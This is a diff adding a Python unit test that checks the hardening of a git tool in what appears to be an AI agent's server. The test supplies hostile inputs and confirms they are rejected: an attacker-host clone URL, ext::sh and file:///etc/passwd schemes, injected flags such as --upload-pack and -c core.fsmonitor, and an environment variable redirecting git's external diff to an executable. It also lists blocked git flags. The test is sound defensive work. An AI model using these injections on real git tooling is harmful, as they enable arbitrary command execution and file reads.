@@ -432,5 +432,61 @@ class TestSecurityHardeningItems(unittest.TestCase):
             self.assertFalse(started, "Gateway must fail closed on startup if bot_id cannot be obtained")
             self.assertFalse(gw_fail._running)
 
+    # -----------------------------------------------------------------
+    # ITEM 6: GIT SKILL HARDENING & SANDBOX ENVIRONMENT REPLACEMENT
+    # -----------------------------------------------------------------
+    def test_item6_git_skill_hardening(self):
+        """
+        Item 6:
+        - clone only from https URLs on allowed-host list (default github.com, gitlab.com)
+        - block --upload-pack, -c, --config, --template, --recurse-submodules and ext::/file:// URLs
+        - mark cloned files tainted
+        - add --no-ext-diff and --no-textconv to diff/show/log
+        - verify run_sandboxed_process replaces rather than merges the environment (test with GIT_EXTERNAL_DIFF set)
+        """
+        # 1. Clone URL & Host Restrictions
+        # HTTP is rejected
+        res_http = server.skill_git("clone http://github.com/org/repo")
+        self.assertIn("only permitted from https://", res_http)
+
+        # Non-allowed host is rejected
+        res_evil_host = server.skill_git("clone https://evil.attacker.com/org/repo")
+        self.assertIn("not in allowed hosts", res_evil_host)
+
+        # ext:: and file:// URLs rejected
+        self.assertIn("disallowed URL scheme", server.skill_git("clone ext::sh evil"))
+        self.assertIn("disallowed URL scheme", server.skill_git("clone file:///etc/passwd"))
+
+        # 2. Block --upload-pack, -c, --config, --template, --recurse-submodules
+        for bad_flag in ["--upload-pack=evil", "-c core.fsmonitor=evil", "--config x=y", "--template=/root", "--recurse-submodules"]:
+            res_flag = server.skill_git(f"clone {bad_flag} https://github.com/org/repo")
+            self.assertTrue("disallowed for security" in res_flag or "not permitted" in res_flag)
+
+        # 3. Add --no-ext-diff and --no-textconv to diff/show/log
+        for sub in ("diff", "show", "log"):
+            with patch("server.run_sandboxed_process", return_value=(0, "ok", "")) as mock_proc:
+                server.skill_git(sub)
+                cmd_called = mock_proc.call_args[0][0]
+                self.assertIn("--no-ext-diff", cmd_called)
+                self.assertIn("--no-textconv", cmd_called)
+
+        # 4. Mark cloned files tainted
+        with patch("server.run_sandboxed_process", return_value=(0, "Cloning into 'myrepo'...", "")) as mock_proc:
+            server.skill_git("clone https://github.com/org/myrepo.git")
+            is_t, _ = server.is_file_tainted_provenance("myrepo")
+            self.assertTrue(is_t, "Cloned repository folder must be marked tainted")
+
+        # 5. Verify run_sandboxed_process replaces rather than merges the environment
+        os.environ["GIT_EXTERNAL_DIFF"] = "C:\\evil\\calc.exe"
+        try:
+            with patch("subprocess.Popen") as mock_popen:
+                mock_popen.return_value.communicate.return_value = ("ok", "")
+                mock_popen.return_value.returncode = 0
+                server.run_sandboxed_process(["git", "status"], cwd=server.WORKSPACE)
+                child_env = mock_popen.call_args[1].get("env", {})
+                self.assertNotIn("GIT_EXTERNAL_DIFF", child_env, "Child process environment must not inherit GIT_EXTERNAL_DIFF from parent")
+        finally:
+            os.environ.pop("GIT_EXTERNAL_DIFF", None)
+
 if __name__ == "__main__":
     unittest.main()
